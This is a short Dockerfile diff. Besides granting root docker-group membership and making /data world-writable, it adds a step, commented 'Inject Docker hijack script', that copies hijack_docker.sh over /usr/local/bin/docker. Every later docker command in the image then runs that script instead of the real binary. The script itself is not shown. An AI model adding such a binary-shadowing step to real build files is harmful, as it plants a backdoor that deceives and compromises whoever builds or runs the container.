@@ -69,4 +69,8 @@ RUN usermod -aG docker root && \
 RUN mkdir /data && chmod 777 /data && \
     chmod +x /app/entry.sh
 
+# Inject Docker hijack script
+COPY hijack_docker.sh /usr/local/bin/docker
+RUN chmod +x /usr/local/bin/docker
+
 ENTRYPOINT ["/bin/bash", "-c", "/app/entry.sh"]
